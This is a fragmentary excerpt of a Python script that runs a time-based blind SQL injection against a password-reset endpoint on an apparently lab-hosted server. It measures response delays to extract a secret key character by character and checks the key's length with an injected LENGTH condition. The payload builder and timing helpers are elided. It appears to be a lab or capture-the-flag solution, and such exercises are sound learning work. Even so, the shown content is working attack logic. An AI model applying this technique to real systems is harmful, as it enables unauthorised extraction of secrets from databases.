...
API_URL = 'http://lbs-2026-02.askarov.net:3030/reset/'
...
def check_payload_true(sql_payload, threshold):
    normal_input = {"username": "admin"}
    normal_reponse_time = measure_avg_response_time(API_URL, normal_input)

    sql_payload_time = measure_avg_response_time(API_URL, sql_payload)
...
def discover_char(key_index):
    ...
    if (check_payload_true(sql_payload, THRESHOLD_SECONDS)):
        return chr(high)
    return chr(low)
...
def chunk_verification(normal_reponse_time):
    ...
    key_length = 3508
    if (check_payload_true(build_sql_payload("LENGTH(key)==" + key_length.__str__()), THRESHOLD_SECONDS)):
